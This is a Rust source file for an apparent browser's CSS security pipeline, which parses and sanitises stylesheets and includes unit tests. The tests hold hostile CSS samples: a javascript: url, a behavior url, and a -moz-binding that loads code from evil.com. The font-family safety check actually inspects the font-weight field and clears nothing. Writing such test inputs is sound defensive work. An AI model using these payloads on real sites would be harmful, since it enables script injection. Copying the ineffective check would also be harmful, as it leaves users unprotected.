//! Enhanced CSS Processing Pipeline with Nation-State Security
//!
//! This module provides the complete CSS processing pipeline that:
//! 1. Parses CSS with security awareness
//! 2. Applies nation-state level security filtering
//! 3. Connects parsed CSS to DOM rendering
//! 4. Ensures all CSS-based attack vectors are neutralized

use std::sync::Arc;
use crate::css::{CitadelCssParser, CitadelStylesheet, ComputedStyle, TransformFunction};
use crate::css_security::{CssSecurityFilter, CssSecurityAnalysis, CssThreatLevel};
use crate::error::ParserError;
use crate::security::SecurityContext;
use crate::metrics::ParserMetrics;
use crate::config::ParserConfig;

/// Complete CSS processing pipeline with nation-state security
pub struct CitadelCssProcessor {
    /// CSS parser for syntax parsing
    parser: CitadelCssParser,
    /// Security filter for threat detection and neutralization
    security_filter: CssSecurityFilter,
    /// Processing metrics
    metrics: Arc<ProcessorMetrics>,
    /// Security context for policy enforcement
    security_context: Arc<SecurityContext>,
}

/// Metrics for CSS processing pipeline
#[derive(Debug, Default)]
pub struct ProcessorMetrics {
    /// Total CSS files processed
    pub files_processed: std::sync::atomic::AtomicUsize,
    /// Total security threats detected
    pub threats_detected: std::sync::atomic::AtomicUsize,
    /// Total rules sanitized
    pub rules_sanitized: std::sync::atomic::AtomicUsize,
    /// Total rules blocked
    pub rules_blocked: std::sync::atomic::AtomicUsize,
    /// Processing performance metrics
    pub total_processing_time_us: std::sync::atomic::AtomicU64,
    /// Memory usage tracking
    pub peak_memory_usage_kb: std::sync::atomic::AtomicUsize,
}

impl ProcessorMetrics {
    pub fn increment_files_processed(&self) {
        self.files_processed.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    }

    pub fn increment_threats_detected(&self) {
        self.threats_detected.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    }

    pub fn add_rules_sanitized(&self, count: usize) {
        self.rules_sanitized.fetch_add(count, std::sync::atomic::Ordering::Relaxed);
    }

    pub fn add_rules_blocked(&self, count: usize) {
        self.rules_blocked.fetch_add(count, std::sync::atomic::Ordering::Relaxed);
    }

    pub fn add_processing_time(&self, time_us: u64) {
        self.total_processing_time_us.fetch_add(time_us, std::sync::atomic::Ordering::Relaxed);
    }

    pub fn update_peak_memory(&self, memory_kb: usize) {
        let current = self.peak_memory_usage_kb.load(std::sync::atomic::Ordering::Relaxed);
        if memory_kb > current {
            self.peak_memory_usage_kb.store(memory_kb, std::sync::atomic::Ordering::Relaxed);
        }
    }
}

/// Processing result with security analysis
#[derive(Debug, Clone)]
pub struct ProcessingResult {
    /// Processed and secured stylesheet
    pub stylesheet: CitadelStylesheet,
    /// Security analysis results
    pub security_analysis: CssSecurityAnalysis,
    /// Processing metadata
    pub processing_metadata: ProcessingMetadata,
}

/// Metadata about the CSS processing
#[derive(Debug, Clone)]
pub struct ProcessingMetadata {
    /// Original CSS size in bytes
    pub original_size_bytes: usize,
    /// Sanitized CSS size in bytes
    pub sanitized_size_bytes: usize,
    /// Compression ratio (sanitized/original)
    pub compression_ratio: f32,
    /// Processing time in microseconds
    pub processing_time_us: u64,
    /// Memory usage during processing
    pub memory_usage_bytes: usize,
    /// Number of threats neutralized
    pub threats_neutralized: usize,
}

impl CitadelCssProcessor {
    /// Create a new CSS processor with nation-state security
    pub fn new(config: ParserConfig, parser_metrics: Arc<ParserMetrics>) -> Self {
        let security_level = match config.security_level {
            crate::SecurityLevel::Maximum => 5,
            crate::SecurityLevel::High => 10,
            crate::SecurityLevel::Balanced => 20,
            crate::SecurityLevel::Custom => 30,
        };

        let security_context = Arc::new(SecurityContext::new(security_level));
        let parser = CitadelCssParser::new(config.clone(), parser_metrics);
        let security_filter = CssSecurityFilter::new(security_context.clone());
        let metrics = Arc::new(ProcessorMetrics::default());

        Self {
            parser,
            security_filter,
            metrics,
            security_context,
        }
    }

    /// Process CSS content with complete security pipeline
    pub fn process_css(&self, css_content: &str) -> Result<ProcessingResult, ParserError> {
        let start_time = std::time::Instant::now();
        let original_size = css_content.len();

        self.metrics.increment_files_processed();

        // Step 1: Security analysis and sanitization
        let security_analysis = self.security_filter.analyze_css(css_content)?;

        // Step 2: Parse sanitized CSS
        let stylesheet = self.parser.parse_stylesheet(&security_analysis.sanitized_css)?;

        // Step 3: Enhanced security validation
        self.validate_parsed_stylesheet(&stylesheet, &security_analysis)?;

        let processing_time = start_time.elapsed();
        let memory_usage = self.estimate_memory_usage(&stylesheet, &security_analysis);

        // Update metrics
        self.metrics.add_processing_time(processing_time.as_micros() as u64);
        self.metrics.update_peak_memory(memory_usage / 1024);

        if security_analysis.threat_level != CssThreatLevel::Safe {
            self.metrics.increment_threats_detected();
        }
        self.metrics.add_rules_sanitized(security_analysis.modified_rules.len());
        self.metrics.add_rules_blocked(security_analysis.blocked_rules.len());

        let processing_metadata = ProcessingMetadata {
            original_size_bytes: original_size,
            sanitized_size_bytes: security_analysis.sanitized_css.len(),
            compression_ratio: security_analysis.sanitized_css.len() as f32 / original_size.max(1) as f32,
            processing_time_us: processing_time.as_micros() as u64,
            memory_usage_bytes: memory_usage,
            threats_neutralized: security_analysis.violations_count,
        };

        Ok(ProcessingResult {
            stylesheet,
            security_analysis,
            processing_metadata,
        })
    }

    /// Enhanced validation of parsed stylesheet
    fn validate_parsed_stylesheet(&self, stylesheet: &CitadelStylesheet, analysis: &CssSecurityAnalysis) -> Result<(), ParserError> {
        // Validate that no dangerous patterns made it through
        for rule in &stylesheet.rules {
            self.validate_rule_security(rule)?;
        }

        // Check for attack patterns in the overall structure
        if analysis.attack_types.iter().any(|attack| matches!(attack,
            crate::css_security::CssAttackType::ScriptInjection)) {
            return Err(ParserError::SecurityViolation(
                "Critical security threats detected in CSS content".to_string()
            ));
        }

        // Validate resource usage
        if stylesheet.rules.len() > 10000 {
            return Err(ParserError::SecurityViolation(
                "Too many CSS rules detected - potential DoS attack".to_string()
            ));
        }

        Ok(())
    }

    /// Validate individual CSS rule security
    fn validate_rule_security(&self, rule: &crate::css::StyleRule) -> Result<(), ParserError> {
        // Check selector length
        if rule.selectors.len() > 1000 {
            return Err(ParserError::SecurityViolation(
                "CSS selector too long - potential attack".to_string()
            ));
        }

        // Check declaration count
        if rule.declarations.len() > 100 {
            return Err(ParserError::SecurityViolation(
                "Too many declarations in CSS rule - potential attack".to_string()
            ));
        }

        // Validate each declaration
        for declaration in &rule.declarations {
            self.validate_declaration_security(declaration)?;
        }

        Ok(())
    }

    /// Validate individual CSS declaration security
    fn validate_declaration_security(&self, declaration: &crate::css::Declaration) -> Result<(), ParserError> {
        // Check property name length
        if declaration.property.len() > 100 {
            return Err(ParserError::SecurityViolation(
                "CSS property name too long".to_string()
            ));
        }

        // Check value length
        if declaration.value.len() > 1000 {
            return Err(ParserError::SecurityViolation(
                "CSS property value too long".to_string()
            ));
        }

        // Check for dangerous characters
        if declaration.value.contains('<') || declaration.value.contains('>') {
            return Err(ParserError::SecurityViolation(
                "CSS value contains dangerous characters".to_string()
            ));
        }

        Ok(())
    }

    /// Estimate memory usage of processing
    fn estimate_memory_usage(&self, stylesheet: &CitadelStylesheet, analysis: &CssSecurityAnalysis) -> usize {
        let stylesheet_size = std::mem::size_of::<CitadelStylesheet>() +
            (stylesheet.rules.len() * std::mem::size_of::<crate::css::StyleRule>());

        let analysis_size = std::mem::size_of::<CssSecurityAnalysis>() +
            analysis.metadata.memory_usage_bytes;

        stylesheet_size + analysis_size
    }

    /// Get processing metrics
    pub fn get_metrics(&self) -> &ProcessorMetrics {
        &self.metrics
    }

    /// Create computed styles for DOM elements with security
    pub fn compute_element_styles(
        &self,
        tag_name: &str,
        classes: &[String],
        id: Option<&str>,
        stylesheet: &CitadelStylesheet,
    ) -> ComputedStyle {
        // Use the existing stylesheet compute method with security awareness
        let mut computed = stylesheet.compute_styles(tag_name, classes, id);

        // Apply security-enhanced defaults
        self.apply_security_enhancements(&mut computed);

        computed
    }

    /// Apply security enhancements to computed styles
    fn apply_security_enhancements(&self, computed: &mut ComputedStyle) {
        // Ensure safe default values
        if computed.color.is_none() {
            computed.color = Some(crate::css::ColorValue::Named("black".to_string()));
        }

        if computed.background_color.is_none() {
            computed.background_color = Some(crate::css::ColorValue::Named("white".to_string()));
        }

        if computed.font_size.is_none() {
            computed.font_size = Some(crate::css::LengthValue::Px(16.0));
        }

        // Block dangerous CSS features that might have slipped through
        if !computed.transform.is_empty() {
            // Log and clear transforms for security
            tracing::warn!("CSS transforms blocked for security");
            computed.transform.clear();
        }

        // Ensure safe font families
        if let Some(font_family) = &computed.font_weight {
            // This is a simplified check - in a real implementation,
            // we'd parse the font-family property properly
            if font_family.contains("url(") || font_family.contains("@import") {
                tracing::warn!("Dangerous font-family declaration blocked");
                // Would clear the font-family in a full implementation
            }
        }
    }

    /// Reset processing metrics
    pub fn reset_metrics(&self) {
        self.metrics.files_processed.store(0, std::sync::atomic::Ordering::Relaxed);
        self.metrics.threats_detected.store(0, std::sync::atomic::Ordering::Relaxed);
        self.metrics.rules_sanitized.store(0, std::sync::atomic::Ordering::Relaxed);
        self.metrics.rules_blocked.store(0, std::sync::atomic::Ordering::Relaxed);
        self.metrics.total_processing_time_us.store(0, std::sync::atomic::Ordering::Relaxed);
        self.metrics.peak_memory_usage_kb.store(0, std::sync::atomic::Ordering::Relaxed);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::SecurityLevel;

    fn create_test_processor() -> CitadelCssProcessor {
        let config = ParserConfig::default();
        let metrics = Arc::new(ParserMetrics::default());
        CitadelCssProcessor::new(config, metrics)
    }

    #[test]
    fn test_safe_css_processing() {
        let processor = create_test_processor();

        let safe_css = r#"
            body {
                color: #333;
                background-color: #fff;
                font-size: 16px;
                margin: 0;
                padding: 20px;
            }

            .container {
                max-width: 1200px;
                margin: 0 auto;
            }
        "#;

        let result = processor.process_css(safe_css).unwrap();
        assert_eq!(result.security_analysis.threat_level, CssThreatLevel::Safe);
        assert_eq!(result.security_analysis.violations_count, 0);
        assert!(!result.stylesheet.rules.is_empty());
    }

    #[test]
    fn test_malicious_css_blocking() {
        let processor = create_test_processor();

        let malicious_css = r#"
            body {
                background: url('javascript:alert(1)');
                behavior: url(#default#time2);
                -moz-binding: url("http://evil.com/xbl.xml#exec");
            }
        "#;

        let result = processor.process_css(malicious_css).unwrap();
        assert!(matches!(result.security_analysis.threat_level, CssThreatLevel::Critical | CssThreatLevel::Dangerous));
        assert!(result.security_analysis.violations_count > 0);
        assert!(result.processing_metadata.threats_neutralized > 0);
    }

    #[test]
    fn test_fingerprinting_sanitization() {
        let processor = create_test_processor();

        let fingerprinting_css = r#"
            @font-face {
                font-family: 'CustomFont';
                src: url('https://evil.com/font.woff2');
            }

            @media (min-width: 1920px) and (max-width: 3840px) {
                body { font-size: 18px; }
            }

            @media (resolution: 2dppx) {
                .high-dpi { border: 1px solid #000; }
            }
        "#;

        let result = processor.process_css(fingerprinting_css).unwrap();
        assert!(matches!(result.security_analysis.threat_level, CssThreatLevel::Suspicious | CssThreatLevel::Safe));
        // Should be sanitized to safe level
        assert!(result.processing_metadata.sanitized_size_bytes <= result.processing_metadata.original_size_bytes);
    }

    #[test]
    fn test_element_style_computation() {
        let processor = create_test_processor();

        let css = r#"
            .highlight {
                color: red;
                background-color: yellow;
                font-weight: bold;
            }

            #main {
                font-size: 20px;
                margin: 10px;
            }
        "#;

        let result = processor.process_css(css).unwrap();
        let stylesheet = result.stylesheet;

        // Test style computation for element with class
        let styles = processor.compute_element_styles("div", &["highlight".to_string()], None, &stylesheet);
        assert_eq!(styles.color, Some(crate::css::ColorValue::Named("red".to_string())));
        assert_eq!(styles.background_color, Some(crate::css::ColorValue::Named("yellow".to_string())));

        // Test style computation for element with ID
        let styles = processor.compute_element_styles("div", &[], Some("main"), &stylesheet);
        assert_eq!(styles.font_size, Some(crate::css::LengthValue::Px(20.0)));
    }

    #[test]
    fn test_security_enhancements() {
        let processor = create_test_processor();

        let css = r#"
            .test {
                /* This should have some default values applied */
            }
        "#;

        let result = processor.process_css(css).unwrap();
        let stylesheet = result.stylesheet;

        let styles = processor.compute_element_styles("div", &["test".to_string()], None, &stylesheet);

        // Security enhancements should provide safe defaults
        assert!(styles.color.is_some());
        assert!(styles.background_color.is_some());
        assert!(styles.font_size.is_some());
    }

    #[test]
    fn test_metrics_tracking() {
        let processor = create_test_processor();

        // Process some CSS to generate metrics
        let _ = processor.process_css("body { color: red; }").unwrap();
        let _ = processor.process_css("div { margin: 10px; }").unwrap();

        let metrics = processor.get_metrics();
        assert_eq!(metrics.files_processed.load(std::sync::atomic::Ordering::Relaxed), 2);

        // Reset and verify
        processor.reset_metrics();
        assert_eq!(metrics.files_processed.load(std::sync::atomic::Ordering::Relaxed), 0);
    }
}